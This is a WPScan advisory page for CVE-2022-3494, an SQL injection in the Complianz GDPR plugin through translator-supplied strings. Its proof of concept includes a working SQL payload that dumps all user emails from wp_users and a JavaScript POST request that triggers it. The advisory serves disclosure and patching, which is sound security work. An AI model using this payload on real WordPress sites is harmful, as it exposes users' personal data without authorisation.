=== Content from wpscan.com_d2580ada_20250115_101430.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Complianz (Free < 6.3.4, Premium < 6.3.6) - Translator SQLi

### Description

The plugins allow a translators to inject arbitrary SQL through an unsanitized translation. SQL can be injected through an infected translation file, or by a user with a translator role through translation plugins such as Loco Translate or WPML.

### Proof of Concept

1. Install Complianz and set the following options in the wizard:
"Does your website use cookies for advertising?" = yes
"Are any of your advertising cookies used to show personalized ads?" = yes.
These two settings are required for the vulnerability to work. Any other settings should not matter.
2. Install Loco Translate and create a user with a translator role. You could also use WPML or any other solution that allows a translator user to edit translations and access /wp-admin
3. Log in as the translator and translate the following text:
"We use technologies like cookies to store and/or access device information. We do this to improve browsing experience and to show personalized ads. Consenting to these technologies will allow us to process data such as browsing behavior or unique IDs on this site. Not consenting or withdrawing consent, may adversely affect certain features and functions."
into an injection (without the double quotes):
"', message\_optin = (SELECT CONCAT('DATA\_KEY=',group\_concat(user\_email separator ';')) FROM wp\_users) #"
4. Make the following POST request as the translator from the WP admin panel:
const data = new FormData();
data.append('wizard\_type', 'last\_step');
fetch('/wp-admin/admin.php', {
method: "POST",
credentials: 'same-origin',
body: data
}).then(response => response.text())
.then(data => {
console.log(data);
})
This re-does Complianz wizard's last step, which executes the injected SQL and saves its output as the cookie popup's default text.
5. Go to the front page. Now the injection result will be displayed at the site's frontend inside the cookie popup.

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

complianz-gdpr](https://a8cteam5105.wordpress.com/plugin/complianz-gdpr/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 6.3.4

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

complianz-gdpr-premium](https://a8cteam5105.wordpress.com/plugin/complianz-gdpr-premium/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 6.3.6

### References

CVE
[CVE-2022-3494](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3494)

### Classification

Type
SQLI

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-89](https://cwe.mitre.org/data/definitions/89.html)

CVSS
[5.8 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:N/A:N)

### Miscellaneous

Original Researcher
Sakri Rafael Koskimies (saggre)

Submitter
Sakri Rafael Koskimies (saggre)

Submitter website
<https://saggre.com>

Verified
Yes

WPVDB ID
[71db75c0-5907-4237-884f-8db88b1a9b34](https://a8cteam5105.wordpress.com/vulnerability/71db75c0-5907-4237-884f-8db88b1a9b34/)

### Timeline

Publicly Published
2022-10-17 (about 2 years ago)

Added
2022-10-17 (about 2 years ago)

Last Updated
2022-10-17 (about 2 years ago)

### Other

Published
Title

Published
2021-07-23
Title
[WordPress Membership SwiftCloud.io <= 1.0 - Authenticated SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/68530e63-bba3-4a9a-ae83-516684aa5dc6/)

Published
2021-10-11
Title
[Affiliate Manager < 2.8.7 - Admin+ SQL injection](https://a8cteam5105.wordpress.com/vulnerability/ebd6d13c-572e-4861-b7d1-a7a87332ce0d/)

Published
2023-04-18
Title
[Email posts to subscribers <= 6.2 - Unauthenticated SQLi](https://a8cteam5105.wordpress.com/vulnerability/7fbd7016-1f1f-46fd-ae88-d3a927eb5191/)

Published
2014-08-01
Title
[Global Content Blocks <= 1.2 - SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/812a21f5-1015-4f79-8817-44b18ce080d9/)

Published
2021-03-15
Title
[Tutor LMS < 1.8.3 - SQL Injection via tutor\_quiz\_builder\_get\_question\_form](https://a8cteam5105.wordpress.com/vulnerability/9b8da6b7-f1d6-4a7d-a621-4ca01e4b7496/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

